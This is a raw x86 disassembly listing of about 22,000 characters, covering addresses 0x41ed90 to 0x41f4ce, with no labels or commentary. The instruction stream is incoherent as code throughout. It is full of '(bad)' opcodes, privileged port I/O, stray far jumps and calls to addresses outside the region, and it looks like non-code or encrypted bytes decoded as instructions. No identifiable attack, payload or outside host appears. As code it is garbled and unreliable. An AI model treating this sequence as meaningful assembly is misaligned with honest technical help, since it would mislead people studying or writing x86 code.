  41ed90:	mov    ecx,0x6c3c5452
  41ed95:	pop    esi
  41ed96:	outs   dx,DWORD PTR ds:[esi]
  41ed97:	mov    ah,0xf2
  41ed99:	mov    DWORD PTR [ebp+0x68fa1a18],ecx
  41ed9f:	scas   al,BYTE PTR es:[edi]
  41eda0:	mul    BYTE PTR [edx]
  41eda2:	sbb    BYTE PTR [ebp+0x57],ch
  41eda5:	(bad)  
  41eda6:	cwde   
  41eda7:	push   esi
  41eda8:	add    cl,BYTE PTR [eax+ecx*8-0x530857de]
  41edaf:	xchg   esp,eax
  41edb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edb1:	mov    esp,0xd9492b8e
  41edb6:	xor    BYTE PTR [ebp-0x19],cl
  41edb9:	ficomp WORD PTR [ecx-0x11]
  41edbc:	adc    edx,eax
  41edbe:	add    BYTE PTR [edx+edi*1-0x4322c4a4],cl
  41edc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edc6:	(bad)  
  41edc7:	adc    edi,edx
  41edc9:	or     al,0x53
  41edcb:	xor    dl,ah
  41edcd:	in     eax,0x4
  41edcf:	fcomp  DWORD PTR [ecx-0x3582493e]
  41edd5:	mov    ch,dh
  41edd7:	sbb    eax,DWORD PTR [ebx+edi*4-0x55]
  41eddb:	leave  
  41eddc:	loopne 0x41edad
  41edde:	outs   dx,DWORD PTR ds:[esi]
  41eddf:	test   DWORD PTR [ebx],edi
  41ede1:	sbb    edx,0xdfc97483
  41ede7:	dec    edi
  41ede8:	add    eax,0xd6b6c375
  41eded:	adc    edx,DWORD PTR [ebx]
  41edef:	loop   0x41edc5
  41edf1:	pop    esp
  41edf2:	scas   eax,DWORD PTR es:[edi]
  41edf3:	ds push 0xffffffc7
  41edf6:	mov    bh,0xd2
  41edf8:	pop    ebp
  41edf9:	jge    0x41ee0e
  41edfb:	cmp    al,0x4f
  41edfd:	xchg   esi,eax
  41edfe:	dec    ecx
  41edff:	out    0x7f,al
  41ee01:	ins    WORD PTR es:[edi],dx
  41ee03:	mov    ds:0xf920ca99,al
  41ee08:	xchg   edx,eax
  41ee09:	and    DWORD PTR [edx],0xb1a5fd2c
  41ee0f:	test   BYTE PTR [esi+edi*1-0x7e],0x6
  41ee14:	lea    edi,[ecx+0xe]
  41ee17:	jge    0x41edb8
  41ee19:	aam    0xb8
  41ee1b:	pop    edi
  41ee1c:	jmp    0x768fb14e
  41ee21:	loopne 0x41ee39
  41ee23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee24:	int    0xf1
  41ee26:	mov    WORD PTR [edi+0x28bca83a],ss
  41ee2c:	lds    ecx,FWORD PTR [ecx-0x2e]
  41ee2f:	cmp    al,0xd9
  41ee31:	into   
  41ee32:	inc    edx
  41ee33:	fprem  
  41ee35:	mov    bh,0x22
  41ee37:	in     eax,0xa2
  41ee39:	cmc    
  41ee3a:	sbb    DWORD PTR [edi],ebp
  41ee3c:	rcl    esp,cl
  41ee3e:	jp     0x41ee45
  41ee40:	fdivr  DWORD PTR [ebp-0x29ee6f2c]
  41ee46:	jmp    0x4fd43bdc
  41ee4b:	and    al,0x63
  41ee4d:	jno    0x41ee82
  41ee4f:	jecxz  0x41ee0f
  41ee51:	push   ss
  41ee52:	xchg   esp,eax
  41ee53:	xor    BYTE PTR [eax+0x11825ad3],cl
  41ee59:	mov    dl,0x54
  41ee5b:	jb     0x41ee50
  41ee5d:	popf   
  41ee5e:	punpckhwd mm5,mm3
  41ee61:	(bad)  
  41ee62:	push   ecx
  41ee63:	xchg   ecx,eax
  41ee64:	push   cs
  41ee65:	shr    dl,0x24
  41ee68:	int3   
  41ee69:	mov    DWORD PTR [ebx+0x1145732a],ebp
  41ee6f:	sar    BYTE PTR [esi-0x2893119d],1
  41ee75:	mov    edx,0xe1041303
  41ee7a:	and    eax,0x6b35d658
  41ee7f:	xchg   DWORD PTR [eax+0x2b],eax
  41ee82:	out    0x63,al
  41ee84:	scas   al,BYTE PTR es:[edi]
  41ee85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee86:	mov    edi,0x28298eab
  41ee8b:	dec    edx
  41ee8c:	in     eax,dx
  41ee8d:	sbb    BYTE PTR [edi+eiz*1],bh
  41ee90:	sub    dl,BYTE PTR [edx+0x5d]
  41ee93:	icebp  
  41ee94:	aas    
  41ee95:	test   al,0x9e
  41ee97:	jecxz  0x41eeb7
  41ee99:	dec    edi
  41ee9b:	push   esi
  41ee9c:	sbb    al,al
  41ee9e:	ins    BYTE PTR es:[edi],dx
  41ee9f:	cld    
  41eea0:	pop    edx
  41eea1:	push   ebp
  41eea2:	stos   DWORD PTR es:[edi],eax
  41eea3:	dec    ecx
  41eea4:	sub    ecx,DWORD PTR [ebp-0x557b5936]
  41eeaa:	sub    eax,0xa24b3520
  41eeaf:	data16 sub al,0x68
  41eeb2:	and    dl,BYTE PTR ds:0x73a144f4
  41eeb8:	adc    BYTE PTR [edx+0x5c],cl
  41eebb:	mov    WORD PTR [edi],fs
  41eebd:	cld    
  41eebe:	push   es
  41eebf:	and    ch,BYTE PTR [edi+ebp*2-0x39cd26b9]
  41eec6:	int3   
  41eec7:	repnz ins DWORD PTR es:[edi],dx
  41eec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeca:	add    BYTE PTR [ebp+ebx*1-0x3e],al
  41eece:	clc    
  41eecf:	shl    DWORD PTR [ecx-0x1ba65556],0xca
  41eed6:	out    dx,al
  41eed7:	push   ebx
  41eed8:	pop    edi
  41eed9:	mov    es,WORD PTR [ebx-0x56]
  41eedc:	rol    BYTE PTR [esi+0x7],1
  41eedf:	out    dx,eax
  41eee0:	je     0x41eeab
  41eee2:	les    eax,FWORD PTR [esi]
  41eee4:	arpl   WORD PTR [ecx+0x51e35292],si
  41eeea:	stc    
  41eeeb:	push   ebx
  41eeec:	dec    ebx
  41eeed:	test   ecx,esp
  41eeef:	dec    edx
  41eef0:	ret    
  41eef1:	xor    eax,0x7c60f464
  41eef6:	rcl    BYTE PTR [edi],cl
  41eef8:	adc    edx,ebx
  41eefa:	(bad)  
  41eefb:	nop
  41eefc:	push   ebp
  41eefd:	call   0xd0c8:0xbf294c6d
  41ef04:	jg     0x41eee1
  41ef06:	loopne 0x41eecb
  41ef08:	es push edi
  41ef0a:	and    eax,0x1b
  41ef0d:	sbb    DWORD PTR [edi-0x1b],ebx
  41ef10:	mov    ds:0x2350c59e,eax
  41ef15:	out    dx,eax
  41ef16:	fisttp DWORD PTR [eax+0x1be01f97]
  41ef1c:	push   ebx
  41ef1d:	cmp    eax,0xff89318
  41ef22:	clc    
  41ef23:	inc    ecx
  41ef24:	lods   eax,DWORD PTR ds:[esi]
  41ef25:	mov    eax,0xe4ee564b
  41ef2a:	xchg   ebx,eax
  41ef2b:	cmc    
  41ef2c:	shl    cl,0x8b
  41ef2f:	or     DWORD PTR [edx],edx
  41ef31:	xchg   esp,eax
  41ef32:	sub    BYTE PTR [edx],bl
  41ef34:	(bad)  
  41ef35:	cmp    al,0xdb
  41ef37:	jl     0x41ef11
  41ef39:	(bad)  
  41ef3a:	fisub  DWORD PTR [edi]
  41ef3c:	add    eax,0xe80d9b7d
  41ef41:	daa    
  41ef42:	inc    edi
  41ef43:	add    ebp,esi
  41ef45:	mov    edx,0x35afba4b
  41ef4a:	aas    
  41ef4b:	sti    
  41ef4c:	loopne 0x41eee3
  41ef4e:	addr16 pop ebp
  41ef50:	(bad)  
  41ef52:	stos   DWORD PTR es:[edi],eax
  41ef53:	inc    edi
  41ef54:	out    dx,eax
  41ef55:	lods   eax,DWORD PTR ds:[esi]
  41ef56:	or     dl,ch
  41ef58:	sbb    eax,0xd8ebf01
  41ef5d:	cmp    BYTE PTR [edx],al
  41ef5f:	(bad)  
  41ef61:	and    ecx,DWORD PTR [esi+0x4f]
  41ef64:	fsubr  DWORD PTR [esi+ebx*4+0x2088dd60]
  41ef6b:	shr    edi,0xa2
  41ef6e:	pop    ds
  41ef6f:	sbb    BYTE PTR [ebx+0x6adca6aa],ah
  41ef75:	sub    al,0x33
  41ef77:	or     DWORD PTR [ecx+0x1d],edi
  41ef7a:	ret    0x9397
  41ef7d:	cs sbb eax,0x13cabeec
  41ef83:	rol    ebp,1
  41ef85:	mov    esp,0xd1bc04ce
  41ef8a:	les    ebp,FWORD PTR [ebp-0x44d4f8aa]
  41ef90:	pusha  
  41ef91:	sbb    eax,0x31fb9b91
  41ef96:	les    esp,FWORD PTR [ebx+0x28c85d22]
  41ef9c:	test   al,0xbb
  41ef9e:	stos   DWORD PTR es:[edi],eax
  41ef9f:	mov    BYTE PTR [eax-0x4e4721a6],bl
  41efa5:	mov    ebx,0x23b3ba5a
  41efaa:	es ss pop esi
  41efad:	leave  
  41efae:	dec    ebx
  41efaf:	dec    esi
  41efb0:	repnz adc edx,DWORD PTR [edi+0x2b136928]
  41efb7:	test   eax,0x74634d9b
  41efbc:	mov    dl,0xd5
  41efbe:	shld   DWORD PTR [edx],edx,0x4
  41efc2:	jg     0x41efca
  41efc4:	popa   
  41efc5:	bound  ebx,QWORD PTR [ebp+ebx*2-0x1]
  41efc9:	dec    ecx
  41efca:	cmp    esp,DWORD PTR [eax]
  41efcc:	ds jnp 0x41ef7e
  41efcf:	xor    BYTE PTR [ebx-0x3b888eac],0x22
  41efd6:	inc    esp
  41efd7:	mov    esp,edx
  41efd9:	(bad)  
  41efda:	rol    DWORD PTR [esp+edi*2],cl
  41efdd:	jo     0x41ef64
  41efdf:	scas   eax,DWORD PTR es:[edi]
  41efe0:	inc    esp
  41efe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efe2:	adc    DWORD PTR [eax-0x1f58b68d],0x1b
  41efe9:	out    dx,eax
  41efea:	data16 jno 0x41efc1
  41efed:	daa    
  41efee:	inc    edi
  41efef:	lods   eax,DWORD PTR ds:[esi]
  41eff0:	lods   al,BYTE PTR ds:[esi]
  41eff1:	je     0x41f003
  41eff3:	retf   
  41eff4:	aam    0x8b
  41eff6:	cdq    
  41eff7:	sbb    al,0xa7
  41eff9:	pushf  
  41effa:	cwde   
  41effb:	aam    0xd0
  41effd:	sub    al,0x3
  41efff:	mov    eax,0x567b39b1
  41f004:	aaa    
  41f005:	test   DWORD PTR [edx-0x6f94acb8],esi
  41f00b:	in     al,dx
  41f00c:	fidivr WORD PTR [ebp+0x157136b4]
  41f012:	popa   
  41f013:	in     eax,dx
  41f014:	jnp    0x41f067
  41f016:	ss mov ch,0xe6
  41f019:	mov    ds:0xbc71017d,eax
  41f01e:	in     al,0x65
  41f020:	aas    
  41f021:	out    0xec,al
  41f023:	push   es
  41f024:	(bad)  {k7}{z}
  41f029:	cmp    ebx,esp
  41f02b:	or     eax,eax
  41f02d:	lods   eax,DWORD PTR ds:[esi]
  41f02e:	faddp  st(4),st
  41f030:	js     0x41eff5
  41f032:	adc    dl,bl
  41f034:	neg    ah
  41f036:	jns    0x41f060
  41f038:	in     al,dx
  41f039:	or     al,0x18
  41f03b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f03c:	jns    0x41efd7
  41f03e:	inc    esp
  41f03f:	aaa    
  41f040:	repz test eax,0xecba056c
  41f046:	add    eax,0x79ce6d74
  41f04b:	int3   
  41f04c:	pop    ss
  41f04d:	push   DWORD PTR [esi-0x4e]
  41f050:	push   ebx
  41f051:	mov    esp,0x5084b90
  41f056:	or     dh,BYTE PTR [ecx+0x5f4d81ce]
  41f05c:	mov    ebp,0x6dd0d481
  41f061:	fcom   DWORD PTR [edx-0x22bd6b75]
  41f067:	sahf   
  41f068:	push   ebp
  41f069:	addr16 mov dh,0x98
  41f06c:	sbb    edx,edx
  41f06e:	fcomp  DWORD PTR [eax+0x1b]
  41f071:	jl     0x41f094
  41f073:	das    
  41f074:	in     al,0xc4
  41f076:	adc    BYTE PTR [ecx+0x7cb48701],0x22
  41f07d:	push   cs
  41f07e:	adc    ah,BYTE PTR [edx]
  41f080:	out    0x2b,al
  41f082:	ret    0xae31
  41f085:	dec    edi
  41f086:	mov    al,0x2d
  41f088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f089:	xor    ah,BYTE PTR [edx+0x5f]
  41f08c:	cmp    DWORD PTR [edx+ebx*4-0x6e],edi
  41f090:	js     0x41f10a
  41f092:	in     eax,0x48
  41f094:	inc    esp
  41f095:	aas    
  41f096:	mov    BYTE PTR ds:0x9cc19e67,0x1f
  41f09d:	pop    esp
  41f09e:	outs   dx,DWORD PTR ds:[esi]
  41f09f:	loop   0x41f100
  41f0a1:	dec    eax
  41f0a2:	neg    DWORD PTR [ebx-0x29]
  41f0a5:	in     eax,dx
  41f0a6:	icebp  
  41f0a7:	push   ebx
  41f0a8:	or     edi,eax
  41f0aa:	mov    ecx,0xe5c3d9bb
  41f0af:	scas   eax,DWORD PTR es:[edi]
  41f0b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0b2:	fs push ebp
  41f0b4:	cli    
  41f0b5:	call   FWORD PTR [ebp-0x5f]
  41f0b8:	pop    edi
  41f0b9:	pop    ecx
  41f0ba:	mov    ds:0xf6b7e100,eax
  41f0bf:	das    
  41f0c0:	sub    DWORD PTR [edx],0x26c98e76
  41f0c6:	das    
  41f0c7:	jp     0x41f0cf
  41f0c9:	mov    dh,0xf4
  41f0cb:	xchg   DWORD PTR [ecx+edx*4+0x77],edi
  41f0cf:	fs sub al,0x7e
  41f0d2:	fcomi  st,st(3)
  41f0d4:	mov    bh,BYTE PTR [edi+0x1eef3366]
  41f0da:	out    dx,al
  41f0db:	outs   dx,DWORD PTR ds:[esi]
  41f0dc:	xor    ebp,DWORD PTR [eax]
  41f0de:	inc    esi
  41f0df:	pop    edi
  41f0e0:	ret    0x551a
  41f0e3:	out    dx,al
  41f0e4:	jmp    0x571430ab
  41f0e9:	out    0xdc,al
  41f0eb:	xor    bh,BYTE PTR ss:[esi-0x7a239208]
  41f0f2:	jl     0x41f11f
  41f0f4:	xor    al,0xf9
  41f0f6:	mov    BYTE PTR [edx-0x4f],ah
  41f0f9:	arpl   bp,ax
  41f0fb:	into   
  41f0fc:	jl     0x41f0d3
  41f0fe:	dec    ebp
  41f0ff:	gs dec eax
  41f101:	jmp    0xcde:0x6de17e39
  41f108:	push   esp
  41f109:	mov    dl,0x72
  41f10b:	pop    edx
  41f10c:	call   0x696ab774
  41f111:	xchg   edi,eax
  41f113:	xchg   ecx,eax
  41f114:	call   0x5313:0x5efb945
  41f11b:	push   es
  41f11c:	or     DWORD PTR [esi+0x6],esi
  41f11f:	ss ret 
  41f121:	jmp    0x1882:0x8b49fc4a
  41f128:	jb     0x41f14c
  41f12a:	cmp    BYTE PTR ds:0x2a83c9e3,ah
  41f130:	mov    DWORD PTR [edi],edx
  41f132:	sub    al,0x20
  41f134:	lods   al,BYTE PTR ds:[esi]
  41f135:	mov    ebp,0x51f793b6
  41f13a:	xor    edi,ebx
  41f13c:	ret    
  41f13d:	mov    dh,0xa9
  41f13f:	aam    0xc1
  41f141:	jmp    0x4cc360d4
  41f146:	aas    
  41f147:	enter  0x7f14,0xc2
  41f14b:	(bad)  
  41f14c:	xchg   ecx,eax
  41f14d:	call   0x7f12:0xaf0719e0
  41f154:	in     eax,0x57
  41f156:	inc    eax
  41f157:	or     BYTE PTR [eax],0xaa
  41f15a:	test   eax,0x310ee2d5
  41f15f:	jne    0x41f1b7
  41f161:	mov    BYTE PTR [edi+0x41],bl
  41f164:	inc    eax
  41f165:	je     0x41f198
  41f167:	mov    ds,WORD PTR [edx]
  41f169:	adc    ah,ah
  41f16b:	push   cs
  41f16c:	jmp    0xed44:0x8209c1fb
  41f173:	jp     0x41f140
  41f175:	mov    edx,0x75a98eb7
  41f17a:	xor    edi,DWORD PTR [ecx-0x288cc1b2]
  41f180:	scas   eax,DWORD PTR es:[edi]
  41f181:	sahf   
  41f182:	loope  0x41f1c5
  41f184:	jb     0x41f1e1
  41f186:	dec    ecx
  41f187:	fadd   DWORD PTR [ecx+eiz*2-0x41]
  41f18b:	xor    BYTE PTR [esi],0xc1
  41f18e:	inc    ebx
  41f18f:	stc    
  41f190:	in     eax,0x72
  41f192:	loope  0x41f15a
  41f194:	repz cmp BYTE PTR [ecx+0x648eaac0],0xf5
  41f19c:	pop    edx
  41f19d:	retf   
  41f19e:	fst    QWORD PTR [ebx]
  41f1a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1a1:	fnsave [edx]
  41f1a3:	pop    ebp
  41f1a4:	cmc    
  41f1a5:	test   eax,0xa8fc1ca6
  41f1aa:	fadd   QWORD PTR [ebx+0x6cad546d]
  41f1b0:	outs   dx,DWORD PTR ds:[esi]
  41f1b1:	cld    
  41f1b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1b3:	pop    esi
  41f1b4:	leave  
  41f1b5:	mov    cl,0xc5
  41f1b7:	in     al,0x84
  41f1b9:	bnd ret 0x2636
  41f1bd:	aam    0x5a
  41f1bf:	retf   
  41f1c0:	jb     0x41f1b6
  41f1c2:	call   DWORD PTR [esi-0x4a]
  41f1c5:	push   esi
  41f1c6:	pushf  
  41f1c7:	aas    
  41f1c8:	mov    ebp,0xe4325807
  41f1cd:	mov    cl,0x6f
  41f1cf:	ss icebp 
  41f1d1:	push   esi
  41f1d2:	sbb    ecx,ebx
  41f1d4:	mov    ebp,0x1a8b545c
  41f1d9:	xor    eax,0x69e2d877
  41f1de:	icebp  
  41f1df:	(bad)  
  41f1e0:	mov    ebx,0xb6a01cd1
  41f1e5:	repz push cs
  41f1e7:	xchg   BYTE PTR [edx-0x3a],cl
  41f1ea:	(bad)  
  41f1eb:	imul   DWORD PTR [ecx]
  41f1ed:	std    
  41f1ee:	pushf  
  41f1ef:	mov    edx,0xf5a7b66b
  41f1f4:	enter  0x7e9b,0x3c
  41f1f8:	pop    ss
  41f1f9:	rcl    esi,1
  41f1fb:	mov    bl,0x1e
  41f1fd:	pop    esi
  41f1fe:	mov    ecx,0xa7ab77d5
  41f203:	mov    eax,0xc23dd267
  41f208:	sbb    esi,DWORD PTR [ebx-0x6d]
  41f20b:	pop    ecx
  41f20c:	ins    BYTE PTR es:[edi],dx
  41f20d:	test   BYTE PTR [eax-0x29e56f06],dh
  41f213:	add    al,0x6e
  41f215:	pushf  
  41f216:	push   esp
  41f217:	sub    WORD PTR [ecx],bp
  41f21a:	jns    0x41f25a
  41f21c:	and    BYTE PTR ds:0xbb235933,0x5c
  41f223:	mov    bl,0x89
  41f225:	jb     0x41f20d
  41f227:	call   0xdf122aef
  41f22c:	aam    0x57
  41f22e:	dec    edi
  41f22f:	ds sti 
  41f231:	and    eax,0xed2cce57
  41f236:	scas   al,BYTE PTR es:[edi]
  41f237:	shl    dl,cl
  41f239:	(bad)  
  41f23a:	pop    esp
  41f23b:	jle    0x41f2aa
  41f23d:	lods   al,BYTE PTR ds:[esi]
  41f23e:	xchg   esi,eax
  41f23f:	cmp    al,0x3b
  41f241:	xor    DWORD PTR [esi+0x5c6a169b],ecx
  41f247:	aas    
  41f248:	shl    BYTE PTR [ebp+0x34ce9cfa],1
  41f24e:	push   ds
  41f24f:	and    eax,DWORD PTR [eax+esi*2-0x6c360977]
  41f256:	pop    ebp
  41f257:	call   0x20caba81
  41f25c:	xor    BYTE PTR [ebx],dl
  41f25e:	cdq    
  41f25f:	dec    edx
  41f260:	or     DWORD PTR [edx],edi
  41f262:	xchg   BYTE PTR [edi],bh
  41f264:	pop    edx
  41f265:	inc    esi
  41f266:	jmp    0x992486bf
  41f26b:	add    BYTE PTR [ebp*1-0x49586640],ch
  41f272:	mov    esp,0xae4b9e13
  41f277:	aad    0x4
  41f279:	nop
  41f27a:	jecxz  0x41f231
  41f27c:	or     edi,ecx
  41f27e:	mov    BYTE PTR [ecx],ch
  41f280:	ret    0xbd6e
  41f283:	cmp    edi,DWORD PTR [esi]
  41f285:	pop    es
  41f286:	mov    bl,0x17
  41f288:	and    al,0x98
  41f28a:	mov    ch,0x58
  41f28c:	cmc    
  41f28d:	sbb    esp,DWORD PTR [ecx]
  41f28f:	and    al,0x7c
  41f291:	dec    DWORD PTR ds:0xba18bc4
  41f297:	daa    
  41f298:	inc    esp
  41f299:	cmp    BYTE PTR [edi+0x11],al
  41f29c:	add    DWORD PTR [ebx],ebp
  41f29e:	inc    edi
  41f29f:	fidivr DWORD PTR [ecx]
  41f2a1:	mov    ecx,DWORD PTR [edx]
  41f2a3:	outs   dx,BYTE PTR ds:[esi]
  41f2a4:	sbb    eax,0xb5b11756
  41f2a9:	jecxz  0x41f2bc
  41f2ab:	hlt    
  41f2ac:	inc    eax
  41f2ad:	inc    esi
  41f2ae:	push   ebx
  41f2af:	enter  0xa525,0x94
  41f2b3:	(bad)
  41f2b6:	mov    bl,0xc
  41f2b8:	sbb    DWORD PTR [eax-0x4e87cebf],0x393b340b
  41f2c2:	and    eax,0xfae4f799
  41f2c7:	lods   eax,DWORD PTR ds:[esi]
  41f2c8:	scas   al,BYTE PTR es:[edi]
  41f2c9:	sahf   
  41f2ca:	in     eax,0xa4
  41f2cc:	add    al,0x60
  41f2ce:	mov    ebp,0xbe2d899c
  41f2d3:	(bad)  
  41f2d4:	push   eax
  41f2d5:	inc    esp
  41f2d6:	cmp    bl,ch
  41f2d8:	mov    dl,0x7b
  41f2da:	cmc    
  41f2db:	arpl   bp,bx
  41f2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2de:	jge    0x41f2c0
  41f2e0:	cmp    eax,DWORD PTR ds:[edx-0x70]
  41f2e4:	or     al,0xe2
  41f2e6:	in     al,0xb0
  41f2e8:	pop    ebx
  41f2e9:	jnp    0x41f2f4
  41f2eb:	cli    
  41f2ec:	and    al,BYTE PTR [ecx]
  41f2ee:	push   ecx
  41f2ef:	sub    dh,al
  41f2f1:	pop    esi
  41f2f2:	sub    BYTE PTR [edi],0xe7
  41f2f5:	stos   BYTE PTR es:[edi],al
  41f2f6:	pop    esp
  41f2f7:	pushf  
  41f2f8:	jmp    0x324:0xe6b89ccf
  41f2ff:	adc    BYTE PTR [edi+0x37],cl
  41f302:	popa   
  41f303:	not    BYTE PTR [ebx-0xa]
  41f306:	mov    ebx,DWORD PTR [ebp-0x10]
  41f309:	and    ebp,DWORD PTR [esp+edx*2+0x11]
  41f30d:	mov    esp,0xd021c504
  41f312:	cmp    al,0xa6
  41f314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f315:	push   ecx
  41f316:	rcr    DWORD PTR [edx],1
  41f318:	sbb    eax,0xfaf6152e
  41f31d:	imul   ecx,esp,0xcf097b4e
  41f323:	mov    ds:0x79a38c70,al
  41f328:	sar    DWORD PTR [eax],cl
  41f32a:	retf   0x6bbb
  41f32d:	xchg   esp,eax
  41f32e:	and    al,0xc9
  41f330:	stos   DWORD PTR es:[edi],eax
  41f331:	sub    BYTE PTR [ecx],bl
  41f333:	xchg   ebx,eax
  41f334:	popw   ss
  41f336:	mov    dh,0x3a
  41f338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f339:	pusha  
  41f33a:	mov    bl,dl
  41f33c:	xchg   esp,eax
  41f33d:	inc    ebp
  41f33e:	mov    edi,0x96a1ffe1
  41f343:	loopne 0x41f2f1
  41f345:	cs pop es
  41f347:	lea    esi,[edx]
  41f349:	aam    0x68
  41f34b:	xchg   edi,eax
  41f34c:	inc    ebx
  41f34d:	test   BYTE PTR cs:[eax],dh
  41f350:	xchg   esp,eax
  41f351:	mov    ss,ebx
  41f353:	cmp    BYTE PTR ds:0x317aa979,dl
  41f359:	sbb    al,0x37
  41f35b:	push   ebp
  41f35c:	js     0x41f376
  41f35e:	push   ds
  41f35f:	pop    ecx
  41f360:	enter  0xa382,0x26
  41f364:	mov    cl,0x41
  41f366:	lods   al,BYTE PTR ds:[esi]
  41f367:	shl    BYTE PTR ds:0xb88214a8,1
  41f36d:	jp     0x41f3d6
  41f36f:	jno    0x41f2fa
  41f371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f372:	pop    edi
  41f373:	and    eax,0xce4d13de
  41f378:	fwait
  41f379:	cwde   
  41f37a:	jno    0x41f331
  41f37c:	popf   
  41f37d:	or     al,0x9e
  41f37f:	mov    ds:0x4bbe097b,al
  41f384:	cs lahf 
  41f386:	mov    DWORD PTR [ecx+0x1581eadf],edx
  41f38c:	mov    bh,0xed
  41f38e:	int3   
  41f38f:	lds    edi,FWORD PTR [ecx-0x4]
  41f392:	pusha  
  41f393:	ret    0x4896
  41f396:	in     al,dx
  41f397:	(bad)  
  41f398:	gs mov ch,0x56
  41f39b:	cwde   
  41f39c:	mov    ebx,ebx
  41f39e:	ins    BYTE PTR es:[edi],dx
  41f39f:	(bad)  
  41f3a1:	push   ss
  41f3a2:	mov    ecx,0xd665b985
  41f3a7:	loop   0x41f35d
  41f3a9:	bswap  edx
  41f3ab:	jno    0x41f33d
  41f3ad:	(bad)  ds:0x1363a9e1
  41f3b3:	ror    BYTE PTR [eax],cl
  41f3b5:	cmp    al,0x1e
  41f3b7:	xor    ebp,DWORD PTR [ebp+0x970e51f]
  41f3bd:	in     eax,dx
  41f3be:	ret    0x8417
  41f3c1:	inc    edi
  41f3c2:	jle    0x41f362
  41f3c4:	fadd   DWORD PTR [ebx-0x41]
  41f3c7:	sbb    eax,0xcdd1404d
  41f3cc:	aam    0xd
  41f3ce:	fwait
  41f3cf:	mov    WORD PTR [esi-0x59adb19b],ds
  41f3d5:	xor    al,0xd0
  41f3d7:	leave  
  41f3d8:	xchg   esp,eax
  41f3d9:	mov    ebp,0x6cab2e63
  41f3de:	retf   
  41f3df:	push   ss
  41f3e0:	dec    ecx
  41f3e1:	pop    ebx
  41f3e2:	jns    0x41f437
  41f3e4:	push   ds
  41f3e5:	push   ecx
  41f3e6:	ss enter 0xadcb,0x54
  41f3eb:	mov    BYTE PTR [ebx-0x48eeb347],ch
  41f3f1:	inc    eax
  41f3f2:	lahf   
  41f3f3:	out    0xec,al
  41f3f5:	jmp    0x4282818f
  41f3fa:	and    ecx,0x4d
  41f3fd:	sub    al,0x3d
  41f3ff:	popf   
  41f400:	xlat   BYTE PTR ds:[ebx]
  41f402:	xchg   ebx,eax
  41f403:	sbb    al,0x3f
  41f405:	sbb    eax,0xe0d09977
  41f40a:	dec    ebx
  41f40b:	cwde   
  41f40c:	pop    edx
  41f40d:	ds aam 0x5d
  41f410:	sahf   
  41f411:	sub    eax,0xc80617ad
  41f416:	rol    dl,cl
  41f418:	test   BYTE PTR [ebp+0x1d],0x8e
  41f41c:	cwde   
  41f41d:	mov    ds:0xf3ac6fd9,al
  41f422:	ds xchg edx,eax
  41f424:	test   al,0x70
  41f426:	and    DWORD PTR [esi],eax
  41f428:	out    dx,al
  41f429:	in     al,dx
  41f42a:	fimul  WORD PTR [esi]
  41f42c:	sbb    al,0x4d
  41f42e:	iret   
  41f42f:	aad    0xb7
  41f431:	inc    ecx
  41f432:	mov    ch,0x4
  41f434:	add    al,0x28
  41f436:	lods   eax,DWORD PTR ds:[esi]
  41f437:	sub    eax,0xaba41e7
  41f43c:	scas   eax,DWORD PTR es:[edi]
  41f43d:	cdq    
  41f43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f43f:	and    dl,BYTE PTR [edx]
  41f441:	dec    edx
  41f442:	sbb    dl,BYTE PTR [edx-0x49]
  41f445:	rep outs dx,BYTE PTR ds:[esi]
  41f447:	add    eax,eax
  41f449:	outs   dx,DWORD PTR ds:[esi]
  41f44a:	mov    dl,0xbe
  41f44c:	lds    esp,FWORD PTR [ecx+0x34c95ee1]
  41f452:	sbb    BYTE PTR [ebx],dh
  41f454:	inc    ebp
  41f455:	ins    BYTE PTR es:[edi],dx
  41f456:	mov    bl,0x79
  41f458:	popa   
  41f459:	(bad)  
  41f45a:	mov    eax,ds:0xca175c1e
  41f45f:	jnp    0x41f49c
  41f461:	stc    
  41f462:	add    BYTE PTR [ebx+0x682f7f1d],bh
  41f468:	pop    ebx
  41f469:	pop    ebp
  41f46a:	jmp    0x12bc:0x4ea31f0d
  41f471:	or     DWORD PTR [esi+0x6b],esp
  41f474:	test   DWORD PTR [ecx+0x1b826a35],ebp
  41f47a:	push   ebp
  41f47b:	push   ebp
  41f47c:	pop    eax
  41f47d:	in     eax,dx
  41f47e:	xor    BYTE PTR ss:[esi],al
  41f481:	jb     0x41f419
  41f483:	setge  BYTE PTR [esi]
  41f486:	in     eax,0xe7
  41f488:	dec    ecx
  41f489:	ds mov bl,0x70
  41f48c:	xchg   edx,eax
  41f48d:	sbb    al,0xaa
  41f48f:	and    bl,dl
  41f491:	push   eax
  41f492:	fist   WORD PTR [ebx]
  41f494:	out    0xba,al
  41f496:	jo     0x41f441
  41f498:	jae    0x41f450
  41f49a:	xor    bh,BYTE PTR [edx]
  41f49c:	mov    eax,0xbc308cb6
  41f4a1:	mov    eax,DWORD PTR ds:0x61863801
  41f4a7:	out    dx,al
  41f4a8:	add    ebx,esp
  41f4aa:	mov    esi,0xc6718573
  41f4af:	js     0x41f45d
  41f4b1:	je     0x41f503
  41f4b3:	dec    ebx
  41f4b4:	push   es
  41f4b5:	mov    dh,0x67
  41f4b7:	adc    DWORD PTR [esp+ecx*2+0x49d2ace8],esp
  41f4be:	adc    BYTE PTR [eax+0x9c48915],cl
  41f4c4:	jno    0x41f47f
  41f4c6:	fidiv  DWORD PTR [esi+ebp*8-0x7f]
  41f4ca:	sub    ebx,edx
  41f4cc:	xchg   BYTE PTR [eax],bl
  41f4ce:	(bad)
